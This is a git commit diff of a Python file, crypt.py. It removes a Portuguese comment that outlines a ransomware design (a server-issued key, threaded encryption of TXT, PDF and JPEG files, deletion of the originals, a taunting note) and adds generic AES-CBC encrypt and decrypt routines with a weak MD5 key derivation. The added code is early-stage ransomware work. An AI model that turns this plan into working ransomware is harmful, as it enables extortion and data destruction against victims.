4a25cb0efa7fef90727b833f92f70efb3049f587
marinho <tarcisio_marinho09@hotmail.com>
2017-05-17 17:10:06 -0300

    UPDATE

--- crypt.py
+++ crypt.py
@@ -1,11 +1,44 @@
+from hashlib import md5
 from Crypto.Cipher import AES
 from Crypto import Random
 
-'''
-    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
-    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
-    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
-    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
-    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
-    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU
-'''
+def derive_key_and_iv(password, salt, key_length, iv_length):
+    d = d_i = ''
+    while len(d) < key_length + iv_length:
+        d_i = md5(d_i + password + salt).digest()
+        d += d_i
+    return d[:key_length], d[key_length:key_length+iv_length]
+
+def encrypt(in_file, out_file, password, key_length=32):
+    bs = AES.block_size
+    salt = Random.new().read(bs - len('Salted__'))
+    key, iv = derive_key_and_iv(password, salt, key_length, bs)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    out_file.write('Salted__' + salt)
+    finished = False
+    while not finished:
+        chunk = in_file.read(1024 * bs)
+        if len(chunk) == 0 or len(chunk) % bs != 0:
+            padding_length = (bs - len(chunk) % bs) or bs
+            chunk += padding_length * chr(padding_length)
+            finished = True
+        out_file.write(cipher.encrypt(chunk))
+
+def decrypt(in_file, out_file, password, key_length=32):
+    bs = AES.block_size
+    salt = in_file.read(bs)[len('Salted__'):]
+    key, iv = derive_key_and_iv(password, salt, key_length, bs)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    next_chunk = ''
+    finished = False
+    while not finished:
+        chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
+        if len(next_chunk) == 0:
+            padding_length = ord(chunk[-1])
+            chunk = chunk[:-padding_length]
+            finished = True
+        out_file.write(chunk)
+#with open('teste.png', 'rb') as in_file, open('teste.png.crypto', 'wb') as out_file:
+#    encrypt(in_file, out_file, 'password')
+with open('teste.png.crypto', 'rb') as in_file, open('teste.png', 'wb') as out_file:
+    decrypt(in_file, out_file, "password")
